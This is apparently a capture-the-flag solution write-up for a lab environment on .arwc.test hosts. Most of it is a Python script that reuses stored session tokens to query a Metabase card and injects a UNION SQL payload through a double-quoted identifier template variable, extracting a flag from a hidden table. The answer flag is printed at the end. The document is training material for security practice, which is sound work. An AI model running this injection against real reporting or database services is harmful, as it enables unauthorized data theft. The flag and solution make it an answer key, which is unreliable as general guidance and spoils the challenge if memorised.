Requires W09.4 (integration session) and W11.1 (relation schema). Get the planning.relation-exchange route from the planning-data client document. The route points to the REL-QUERY-CRR-R3 Metabase question. The SQL uses `{{relation_type}}` as a double-quoted identifier — inject a UNION to reach relation_responses.

```python
import json, ssl, urllib.request, pathlib, urllib.parse

ctx = ssl.create_default_context(cafile="/tmp/arwc-ca-bundle.pem")
sess = pathlib.Path("handover/corporate-session").read_text().strip()
h = {"Authorization": "Bearer " + sess, "X-ARWC-Tenant": "arwc"}

# Step 1: Get the planning.relation-exchange route URL.
doc = json.loads(urllib.request.urlopen(
    urllib.request.Request("https://planning-data.arwc.test/.well-known/arwc-client", headers=h),
    context=ctx).read())
rel_exchange_url = next(r["template"] for r in doc["routes"] if r["key"] == "planning.relation-exchange")
# rel_exchange_url is a Metabase card URL like:
# https://reports.arwc.test/api/card/<card_id>

card_url = rel_exchange_url
card_id = card_url.rstrip("/").split("/")[-1]
# If it's a full URL with path, extract the integer card id from the query endpoint.

# Step 2: Run the card normally to confirm the query shape.
planner = pathlib.Path("receipts/planner-session").read_text().strip()
mb_h = {"X-Metabase-Session": planner, "Content-Type": "application/json"}

# Normal execution returns work_order_summary rows.
normal = json.loads(urllib.request.urlopen(
    urllib.request.Request(f"https://reports.arwc.test/api/card/{card_id}/query",
                            data=json.dumps({}).encode(), headers=mb_h, method="POST"),
    context=ctx).read())
print("Normal cols:", [c["name"] for c in normal["data"]["cols"]])
# ['name', 'revision', 'relation', 'asset', 'work_order']

# Step 3: UNION injection — the template variable is inserted as a double-quoted identifier.
# SQL becomes: SELECT ... FROM "<injection>" WHERE asset = 'AST-CRR-017'
# Inject to close the identifier and add a UNION that selects from relation_responses.
injection = 'work_order_summary" WHERE 1=0 UNION SELECT name, revision, relation, asset, flag FROM relation_responses--'

result = json.loads(urllib.request.urlopen(
    urllib.request.Request(f"https://reports.arwc.test/api/card/{card_id}/query",
        data=json.dumps({"parameters": [{"type": "category", "target": ["variable", ["template-tag", "relation_type"]], "value": injection}]}).encode(),
        headers=mb_h, method="POST"),
    context=ctx).read())

rows = result["data"]["rows"]
cols = [c["name"] for c in result["data"]["cols"]]
for r in rows:
    row = dict(zip(cols, r))
    if "flag" in str(r):
        print("flag:", row.get("flag") or row.get("work_order"))
        # FLAG{6c7d3f3e1de42300}
```

The flag is the value in the fifth column (`work_order` in the result shape, mapped from `flag` in `relation_responses`).

Flag: `FLAG{6c7d3f3e1de42300}` in the `flag` column of the relation_responses row.
